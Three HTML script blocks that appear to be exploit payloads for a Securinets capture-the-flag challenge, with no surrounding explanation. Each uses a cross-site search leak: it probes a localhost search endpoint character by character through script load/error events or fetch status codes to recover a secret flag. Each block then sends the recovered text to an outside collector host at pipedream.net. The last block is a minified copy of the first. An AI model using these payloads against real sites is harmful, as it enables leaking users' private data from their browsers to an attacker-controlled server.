<script>
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789_}";

  function probeError(url) {
    let script = document.createElement("script");
    script.src = url;
    script.onload = () => {
      for (let i = 0; i < chars.length; i++) {
        probeError(url + chars[i]);
        fetch("https://enoqh110w4yn.x.pipedream.net/?x=" + url);
      }
    };

    script.onerror = () => console.log("Error event triggered");
    document.head.appendChild(script);
  }

  const sleep = (ms) => {
    // call with await sleep(1000)
    return new Promise((resolve) => setTimeout(resolve, ms));
  };

  let query = "securinets{";

  for (let i = 0; i < chars.length; i++) {
    probeError(`http://127.0.0.1/search-profile?search=${query + chars[i]}`);
  }
</script>

<script>
  const leak = async (e) => {
      try {
        let t = await fetch(e);
        if (200 == t.status) return 1;
        return 0;
      } catch (r) {
        return 0;
      }
    },
    sleep = (e) => new Promise((t) => setTimeout(t, e)),
    chars = "abcdefghijklmnopqrstuvwxyz0123456789_}";
  let query = "securinets{";
  async function exploit() {
    for (; !1 == query.includes("}"); )
      for (let e = 0; e < chars.length; e++) {
        let t = await leak(
          `http://127.0.0.1/search-profile?search=${query + chars[e]}`
        );
        if ((await sleep(1e3), 1 == t)) {
          fetch("https://enoqh110w4yn.x.pipedream.net/" + (query += chars[e]));
          break;
        }
      }
  }
  exploit();
</script>


<script>
  const chars="abcdefghijklmnopqrstuvwxyz0123456789_}";function probeError(r){let e=document.createElement("script");e.src=r,e.onload=()=>{for(let o=0;o<chars.length;o++)probeError(r+chars[o]),fetch("https://enoqh110w4yn.x.pipedream.net/?x="+r);e.remove()},e.onerror=()=>console.log("Error event triggered"),document.head.appendChild(e)}const sleep=r=>new Promise(e=>setTimeout(e,r));let query="securinets{";for(let i=0;i<chars.length;i++)probeError(`http://127.0.0.1/search-profile?search=${query+chars[i]}`);
</script>